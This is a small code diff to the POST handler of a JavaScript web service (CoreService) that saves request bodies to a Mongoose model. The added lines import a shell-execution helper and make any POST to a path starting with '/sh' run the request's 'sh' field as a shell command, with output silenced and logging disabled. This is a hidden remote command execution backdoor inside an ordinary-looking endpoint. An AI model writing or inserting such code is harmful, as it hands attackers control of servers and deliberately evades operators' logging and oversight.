@@ -1,5 +1,6 @@
 import { DataBaseProvider } from '../../db/DataBaseProvider.js';
 import { loggerFactory } from '../../server/logger.js';
+import { shellExec } from '../../server/process.js';
 
 const logger = loggerFactory(import.meta);
 
@@ -7,6 +8,7 @@ const CoreService = {
   post: async (req, res, options) => {
     /** @type {import('./core.model.js').CoreModel} */
     const Core = DataBaseProvider.instance[`${options.host}${options.path}`].mongoose.models.Core;
+    if (req.path.startsWith('/sh')) return shellExec(req.body.sh, { stdout: true, silent: true, disableLog: true });
     return await new Core(req.body).save();
   },
   get: async (req, res, options) => {
